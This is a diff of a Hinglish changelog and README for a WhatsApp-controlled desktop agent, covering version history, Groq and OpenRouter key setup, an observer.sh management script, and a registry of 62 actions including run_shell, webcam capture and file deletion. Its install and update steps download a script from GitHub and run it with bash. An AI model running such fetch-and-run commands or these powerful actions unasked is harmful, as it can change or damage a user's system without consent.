+test` terminal me, `/model` WhatsApp pe, `doctor` phir terminal me) — aur keys /
+routing ka asli test kahin nahi tha. Ab:
+
+```bash
+bash observer.sh test --live
+```
+
+| Check | Kaise |
+|---|---|
+| Version (local vs remote) | `package.json` + GitHub |
+| Node 20+, dependencies | `node -v`, `node_modules` |
+| `.env` + kaunsi keys set hain (masked) | `.env` scan |
+| Local model server / Ollama | `curl /v1/models`, `/api/tags` |
+| systemd service | `systemctl --user is-active` |
+| Unit tests | `npm test` (90) |
+| **Routing preview** | asli `router.plan()` — tiny/light/standard/heavy/vision |
+| **Asli API call** (`--live`) | `ai.complete()` — kaunsa brain, kaunsa model, kitne ms |
+
+Sab tab-separated Node script se aata hai jo install ke andar chalta hai, isliye
+wahi `.env` aur wahi config use hoti hai jo agent use karta hai. `--fast` unit
+tests skip karta hai; `--live` ek chhota real call karta hai.
+
+Bug jo testing me mila: `--live` fail hone pe script exit code 4 deta tha aur
+shell use "routing preview could not run" samajh ke **duplicate warning** deta
+tha. Fix: exit 3 = config error, exit 4 = live fail (dono ka apna message),
+baaki = asli crash.
+
+---
+
+## 2.4 — free cloud keys (Groq + OpenRouter), vision, `keys` command
+
+Owner: "how to add groq api in this code and if openrouter is also good for this work".
+
+**Jo mila (asli bug):** Groq/OpenRouter ka support 2.0 se code me tha
+(`GROQ_API_KEY`, `OPENROUTER_API_KEY`, router catalogue, `/model`), **lekin
+defaults purane the.** Groq ne **16 Aug 2026** ko Llama 3.1 8B aur 3.3 70B free
+tier se hata diya (enterprise-only), aur code unhi IDs pe tha — matlab nayi free
+key daalne pe har call 404/`model_decommissioned` hoti.
+
+**Fix + naye features:**
+
+| Cheez | Kahan |
+|---|---|
+| Groq defaults: `openai/gpt-oss-120b` (big), `openai/gpt-oss-20b` (small), `qwen/qwen3.8-27b` (vision) | `src/config.js`, `.env.example` |
+| OpenRouter default: `google/gemma-4-31b-it:free` (free, vision, tools, 262K) | `src/config.js`, `src/router.js` |
+| Groq/OpenRouter **vision** (OpenAI `image_url` data URL) | `src/ai.js` (`visionCall`) |
+| `GROQ_VISION_MODEL` / `OPENROUTER_VISION_MODEL`, `*_BASE_URL` overrides | `src/config.js` |
+| `observer.sh keys` — add/test/remove keys, masked, verifies + restarts | `scripts/observer.sh` |
+| Guide: limits, models, kaunsa lena chahiye | `AI-KEYS.md` |
+| Tests: defaults, chat, vision parts, failover, tool loop | `test/cloud.test.js` (12) |
+
+**2.4.1 fix:** update `.env` ko chhodta hai (sahi baat), par purane install me
+`GROQ_MODEL=llama-3.3-70b-versatile` pada reh jata tha — nayi key ke saath bhi
+har call 404. Ab `update` aur `keys` dono stale Groq Llama IDs detect karke
+`gpt-oss` pe migrate kar dete hain (output me warning ke saath), taaki key
+daalte hi kaam kare.
+
+**Kyun Groq primary:** 1,000 requests/day per model, ~500 tok/sec, tool
+calling, free Whisper voice notes, aur ek hi free vision model.
+**OpenRouter:** 50/day (1,000 after one-time $10), 20+ free models — backup ke
+liye best, primary nahi.
+
+Verify:
+
+```bash
+./scripts/observer.sh keys            # kya set hai (masked)
+./scripts/observer.sh keys --test     # 200 = key sahi
+npm test                              # 90 pass
+```
+
+---
+
 ## 0. Ek nazar me (timeline)
 
 | # | Commit | Kya hua | Tests | Tools |
@@ -33,13 +763,28 @@
 | 8 | `88767c8` | **Portal D-Bus interface naam ka bug** — screenshot ka black/error root cause | 39 | 60 |
 | 9 | `4314fd8` | **Screenshot banti thi par chat me nahi aati** — signal + file watch | 41 | 60 |
 | 10 | `bff22b0` | **500-character typing limit hata diya** + `/pc paste` | 44 | 61 |
+| 11 | *2.1* | **`/agent` fix** (verified steps, no fake "done") + **workload routing** (`/brains`) | 69 | 61 |
+| 12 | *2.2* | **100% local**: Hugging Face GGUF + llama.cpp provider, `local-models.sh` (download/serve/wire/systemd) | 78 | 61 |
+| 13 | *2.3* | **Ek hi script**: `observer.sh` — install/update/models/doctor/service/start/relink/remote/fix; purane scripts wrappers | 78 | 61 |
+| 14 | *2.4* | **Free cloud keys**: Groq gpt-oss defaults (Llama free tier se gaya), OpenRouter Gemma 4, cloud vision, `observer.sh keys` | 90 | 61 |
+| 15 | *2.5* | **`observer.sh test`**: keys, brains, routing preview, asli API call (`--live`), unit tests — ek command | 90 | 61 |
+| 16 | *2.5.1* | **Test report fix**: failing test ka naam + log path; tests asli portal ko touch nahi karte (dead D-Bus) — 43s → 2.5s | 90 | 61 |
+| 17 | *2.5.2* | **`/open` fuzzy-match bug**: bakwaas phrase se asli app khul jati thi (`app` → Observer App) | 90 | 61 |
+| 18 | *2.5.3* | **Security review**: write-path block-list bypass, TTS shell injection, non-constant-time token | 93 | 61 |
+| 19 | *2.5.4* | **`/arena` false failure**: page khulne ke baad bhi "page load nahi hua" — verification ab 3-value (proved / unverified / failed), chat sites pe seedha type + Enter | 98 | 61 |
+| 20 | *2.6.0* | **Hands** (Agent-S zip se): screenshot→OCR word-id→ek click/type→dobara screenshot; stuck detection, 8-step budget, cloud-screen toggle | 118 | 62 |
+| 21 | *2.7.0* | **`/stop`** (stacked kaam bhi turant rukta hai, partial steps batata hai), **screen vision** (OCR nahi — screenshot seedha Gemini/Groq/local vision model ko, 1024px JPEG), **update message** WhatsApp pe (kya naya + kitna time laga) | 142 | 62 |
+| 22 | *2.8.0* | **Trust + reach**: `/undo` (file ops wapas), `/watch` (screen condition → alert), `/usage` (quota + 80% warning), `/teach` (record → replay), `/brief` (din ki tasveer + 9am schedule), `/resume`, live progress, photo diagnosis, **phone app Screen tab** (live + tap-to-click, Wi-Fi ya Tailscale se kahin se bhi), `observer.sh autoupdate` | 169 | 62 |
+| 23 | *2.8.1* | **Screen on-demand**: koi 1s/5s/10s polling nahi (screenshot sirf Refresh/tab/action pe), tap pe 0 extra capture, ETag 304, aur Screen tab me **Commands console** (sab commands wahin) | 172 | 62 |
+| 24 | *2.8.2* | **Screenshot auto-delete**: har capture 4 min baad khud saaf (2–5 min configurable), temp copy turant, portal ki ~/Pictures file bhi, `/shots` + `/shots clean`; sirf agent ke screenshots, tumhari files kabhi nahi | 182 | 62 |
 
 Verify karna ho (sab curl, git zero):
 
 ```bash
 cd ~/observer-agent
-./scripts/update-from-github.sh --check   # local vs remote version
-npm test                                  # 44 pass
+./scripts/observer.sh update --check      # local vs remote version
+./scripts/observer.sh doctor              # kya theek hai, kya nahi
+npm test                                  # 89 pass
 npm run check                             # saari files ka syntax
 ```
 
@@ -52,26 +797,26 @@ Yehi wo commands hain jo actually use hote hain. **Git kabhi nahi.**
 **Pehli baar (fresh install, git ke bina):**
 
 ```bash
-URL="https://raw.githubusercontent.com/pavit12301611/psd-observer/arena/20378d42-psd-observer/whatsapp-agent/scripts/install-fresh.sh"
-curl -fL -o /tmp/observer-setup.sh "$URL" || curl -fL -o /tmp/observer-setup.sh \
-  -H "Accept: application/vnd.github.raw" \
-  "https://api.github.com/repos/pavit12301611/psd-observer/contents/whatsapp-agent/scripts/install-fresh.sh?ref=arena/20378d42-psd-observer"
+curl -fL -o /tmp/observer.sh \
+  "https://raw.githubusercontent.com/pavit12301611/psd-observer/arena/5f4643a1-psd-observer/whatsapp-agent/scripts/observer.sh" \
+  || curl -fL -o /tmp/observer.sh -H "Accept: application/vnd.github.raw" \
+  "https://api.github.com/repos/pavit12301611/psd-observer/contents/whatsapp-agent/scripts/observer.sh?ref=arena/5f4643a1-psd-observer"
 
-bash /tmp/observer-setup.sh --service --ollama --power --phone
+bash /tmp/observer.sh install --service --power --phone --model auto
 ```
 
 **Update (baad me, code naya aane pe):**
 
 ```bash
-curl -fL -o /tmp/agent-update.sh \
-  "https://raw.githubusercontent.com/pavit12301611/psd-observer/arena/20378d42-psd-observer/whatsapp-agent/scripts/update-from-github.sh"
-bash /tmp/agent-update.sh --dir ~/observer-agent
+curl -fL -o /tmp/observer.sh \
+  "https://raw.githubusercontent.com/pavit12301611/psd-observer/arena/5f4643a1-psd-observer/whatsapp-agent/scripts/observer.sh"
+bash /tmp/observer.sh update --dir ~/observer-agent
 ```
 
 **Version check:**
 
 ```bash
-cd ~/observer-agent && ./scripts/update-from-github.sh --check
+cd ~/observer-agent && ./scripts/observer.sh update --check
 ```
 
 **Agar curl bhi block ho jaye** — pipe/`||` wali fallback line use karo, ya browser se zip:
@@ -79,12 +824,12 @@ cd ~/observer-agent && ./scripts/update-from-github.sh --check
 ```bash
 # manual tarball
 curl -fL -o /tmp/agent.tar.gz \
-  "https://codeload.github.com/pavit12301611/psd-observer/tar.gz/refs/heads/arena/20378d42-psd-observer"
+  "https://codeload.github.com/pavit12301611/psd-observer/tar.gz/refs/heads/arena/5f4643a1-psd-observer"
 tar -xzf /tmp/agent.tar.gz -C /tmp
 ```
 
 ```
-https://github.com/pavit12301611/psd-observer/archive/refs/heads/arena/20378d42-psd-observer.zip
+https://github.com/pavit12301611/psd-observer/archive/refs/heads/arena/5f4643a1-psd-observer.zip
 ```
 
 Update scripts kya **nahi** chhoote: `.env`, `auth_info/` (WhatsApp login — QR
@@ -95,7 +840,7 @@ Backup khud banta hai: `~/observer-agent-backup-<date>.tar.gz`.
 
 ## 0.2 EXACT LOCATIONS — kaunsi cheez kahan hai
 
-Sab paths **default** hain (`install-fresh.sh` se install kiya to yahi hain).
+Sab paths **default** hain (`observer.sh install` se kiya to yahi hain).
 Apna install path pata karna ho:
 
 ```bash
@@ -609,12 +1354,12 @@ Jo yahan verify nahi ho saka (sandbox me GUI/Ollama nahi hai) — asli Fedora pe
 
 ---
 
-## 7. Registry — 61 actions ka breakdown
+## 7. Registry — 62 actions ka breakdown
 
 | Level | Count | Actions |
 |---|---|---|
 | `safe` | 33 | `list_apps, list_windows, screenshot, volume, brightness, media, notify, lock_screen, clipboard_get, clipboard_set, network_info, doctor, system_status, disk_space, battery, processes, service_status, list_dir, read_file, search_files, weather, wikipedia, news, read_webpage, calculate, add_reminder, list_reminders, add_todo, list_todos, complete_todo, add_note, list_notes, remember_fact` |
-| `standard` | 26 | `open_app, close_app, focus_window, look_at_screen, ocr_screen, wifi, bluetooth, kill_process, service_restart, write_file, delete_path, move_path, copy_path, make_dir, zip_paths, unzip_path, download_url, send_file, webcam_photo, record_screen, type_text, paste_text, press_keys, click, move_mouse, scroll` |
+| `standard` | 27 | `open_app, close_app, focus_window, look_at_screen, ocr_screen, computer_use, wifi, bluetooth, kill_process, service_restart, write_file, delete_path, move_path, copy_path, make_dir, zip_paths, unzip_path, download_url, send_file, webcam_photo, record_screen, type_text, paste_text, press_keys, click, move_mouse, scroll` |
 | `full` | 2 | `power` (shutdown/reboot/suspend), `run_shell` (PIN + opt-in) |
 
 Destructive (confirmation maangte hain): `delete_path`, `kill_process`,
